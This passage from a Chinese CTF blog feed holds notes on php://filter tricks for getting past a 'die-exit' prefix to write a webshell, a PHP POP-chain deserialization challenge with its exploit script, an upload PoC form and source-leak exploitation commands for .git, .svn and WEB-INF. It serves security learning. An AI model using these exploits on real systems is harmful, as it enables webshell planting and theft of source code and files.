<p><a href="https://www.leavesongs.com/content/uploadfile/201607/0f851469385893.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-0f851469385893.png" alt="QQ截图20160724234603.png"></a></p>
<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/693b1469385893.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-693b1469385893.png" alt="QQ截图20160724235335.png"></a></p>
<h2 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h2><p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
<p>记得前段时间三个白帽有个比赛，其中有一部分代码大概类似于以下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
<p>幸运的是，这里的<code>$_POST['filename']</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'|[^a-z0-9A-Z+/]|s'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode  来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
<p>最后效果是 ：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/fca81469385894.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-fca81469385894.png" alt="QQ截图20160725005316.png"></a></p>
<h2 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_2">利用字符串操作方法</a></h2><p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
<p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p>
<pre><code>echo readfile('php://filter/read=string.strip_tags/resource=php://input');</code></pre>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/499a1469385895.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></a></p>
<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
<p>最终的数据包如下：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/95b61469385895.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-95b61469385895.png" alt="QQ截图20160725011007.png"></a></p>
<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/1c471469385896.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-1c471469385896.png" alt="QQ截图20160725012639.png"></a></p>
<p>当然，这个方法的条件就是不开启短标签。</p>
]]></content>
  </entry>
  <entry>
    <title>pop链</title>
    <url>/2021/07/16/pop-lian/</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p>
<h3 id="PHP魔术方法："><a href="#PHP魔术方法：" class="headerlink" title="PHP魔术方法："></a>PHP魔术方法：</h3><ul>
<li><strong>__sleep() //使用serialize时触发</strong></li>
<li><strong>__destruct() //对象被销毁时触发</strong></li>
<li>__<strong>call() //在对象上下文中调用不可访问的方法时触发</strong></li>
<li><strong>__callStatic() //在静态上下文中调用不可访问的方法时触发</strong></li>
<li><strong>__get() //用于从不可访问的属性读取数据</strong></li>
<li>__<strong>set() //用于将数据写入不可访问的属性</strong></li>
<li><strong>__isset() //在不可访问的属性上调用isset()或empty()触发</strong></li>
<li><strong>__unset() //在不可访问的属性上使用unset()时触发</strong></li>
<li><strong>__toString() //把类当作字符串使用时触发</strong></li>
<li>__<strong>invoke() //当脚本尝试将对象调用为函数时触发</strong></li>
</ul>
<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//flag is in flag.php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Read</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">'Welcome'</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string">'pop3.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<ol>
<li>首先看到unserialize($_GET[‘hello’]) 将get传参的hello进行了反序列化操作。那么将会调用到Show类中</li>
<li>__weakup方法。<br>因为 this-&gt;source = “index.php” source被当做字符串所以调用Show类中的__to string.</li>
<li><strong>return $this-&gt;str[‘str’]-&gt;source</strong> source属性不存在所以调用Test类中的 get方法。</li>
<li><strong>$function = $this-&gt;p;return $function();</strong><br>把取出来的p当做还是调用因此又会引起调用了 Read类中的__invoke方法，其中就可以把文件读取出来了。</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span>
<span class="token punctuation">}</span>

<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> <span class="token operator">-</span><span class="token operator">></span> p <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">"str"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> source <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>post上传的网页源码</title>
    <url>/2021/09/07/post-shang-chuan-de-wang-ye-yuan-ma/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token constant">POST</span>数据包<span class="token constant">POC</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf<span class="token punctuation">=</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--链接是当前打开的题目链接--></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>文件名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>web源码泄露及工具利用</title>
    <url>/2021/09/21/web-yuan-ma-xie-lu-ji-gong-ju-li-yong/</url>
    <content><![CDATA[<h3 id="git泄露"><a href="#git泄露" class="headerlink" title=".git泄露"></a>.git泄露</h3><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
<h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
<h5 id="Githack"><a href="#Githack" class="headerlink" title="Githack"></a>Githack</h5><pre><code>python2 Githack.py http://xxx.com/.git、</code></pre>
<h5 id="dvcs-ripper"><a href="#dvcs-ripper" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-git.pl -v -u http://www.example.com/.git/</code></pre>
<h5 id="Git-Extract"><a href="#Git-Extract" class="headerlink" title="Git_Extract"></a>Git_Extract</h5><pre><code>python2 git_extract.py http://.../.git/</code></pre>
<h3 id="swp文件泄露"><a href="#swp文件泄露" class="headerlink" title="swp文件泄露"></a>swp文件泄露</h3><h4 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>swp即swap文件，在编辑文件时产生的临时文件，它时隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留。</p>
<p>文件名格式：.filename.swp(有时候也可能是swo)</p>
<h4 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>直接按照文件名访问.swp文件，下载回来后再linux中使用vim -r .filename.swp来恢复源码<br>.hg泄露</p>
<h4 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>hg init的时候会生成.hg文件</p>
<p>如：</p>
<pre><code>http://www.xxx.com/.hg/</code></pre>
<h4 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
<h5 id="dvcs-ripper-1"><a href="#dvcs-ripper-1" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-hg.pl -v -u http://www.example.com/.hg/
通用格式：rip-xxx.pl -v -u http://www.example.com/.xx/</code></pre>
<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><h4 id="漏洞成因：-3"><a href="#漏洞成因：-3" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，可以获取敏感的文件名等信息。<br>漏洞利用:</p>
<p>工具：</p>
<h5 id="dsstoreexp"><a href="#dsstoreexp" class="headerlink" title="dsstoreexp"></a>dsstoreexp</h5><pre><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></pre>
<h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><h4 id="漏洞成因：-4"><a href="#漏洞成因：-4" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
<h4 id="常见备份文件后缀"><a href="#常见备份文件后缀" class="headerlink" title="常见备份文件后缀"></a>常见备份文件后缀</h4><pre><code>.rar
.zip
.7z
.tar.gz
.bak
.swp
.txt
.html
.php~
.php.</code></pre>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>工具：</p>
<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><pre><code>python3 dirsearch -u "xxx" -e php,rar,zip,txt</code></pre>
<h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><h4 id="漏洞成因：-5"><a href="#漏洞成因：-5" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。<br>漏洞利用</p>
<p>工具：</p>
<h5 id="dvcs-ripper-2"><a href="#dvcs-ripper-2" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-svn.pl -v -u http://www.example.com/.svn/</code></pre>
<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><h4 id="WEB-INF简介及漏洞成因"><a href="#WEB-INF简介及漏洞成因" class="headerlink" title="WEB-INF简介及漏洞成因"></a>WEB-INF简介及漏洞成因</h4><p>WEB-INF是java的web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对其进行相应的映射才能访问。Tomcat默认禁止这个目录，而Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身缺陷），导致可以通过Nginx访问到Tomcat的WEB-INF目录。</p>
<h4 id="WEB-INF主要包含以下文件或目录："><a href="#WEB-INF主要包含以下文件或目录：" class="headerlink" title="WEB-INF主要包含以下文件或目录："></a>WEB-INF主要包含以下文件或目录：</h4><pre><code>WEB-INF/web.xml：web应用程序配置文件，描述了servlet和其他的应用组件配置和命名规则
WEB-INF/classes：包含了站点的所有class文件，包括servlet class和非servlet class
WEB-INF/lib：存放web应用需要的各种jar文件，放置仅在这个应用中要求的文件，如数据库
WEB-INF/src：源码目录，按照包名结构放置各种java文件
WEB-INF/database.properties：数据库配置文件
META-INF：相当于一个信息包</code></pre>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>直接手工访问/web.xml文件，通过是否回显来判断是否可访问该文件。找到web.xml文件后，根据命名规则推断class文件的路径，最后直接访问class文件，或通过反编译等得到网站源码。</p>
<p>如：</p>
<pre><code>com.wm.ctf.FlagController 推断的文件路径为
WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre>
<h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3><h4 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>直接访问来测试</p>
<pre><code>http://url/CVS/Root 返回根信息
http://url/CVS/Entries 返回所有文件的结构</code></pre>
<h4 id="取回源码的命令-liunx下"><a href="#取回源码的命令-liunx下" class="headerlink" title="取回源码的命令(liunx下)"></a>取回源码的命令(liunx下)</h4><pre><code>bk clone http://url/aaa bbb</code></pre>
<p>意思是把远端一个名为aaa的repo仓库clone到本地名为bbb的目录下</p>
<p>查看所有的改变的命令(转到downloads目录下)</p>
<pre><code>bk changes</code></pre>
<h3 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><p>工具：</p>
<h5 id="dvcs-ripper-3"><a href="#dvcs-ripper-3" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre>
<p>原文链接：<a href="https://blog.csdn.net/Dguaiguai/article/details/108165939">https://blog.csdn.net/Dguaiguai/article/details/108165939</a></p>
]]></content>
  </entry>
  <entry>
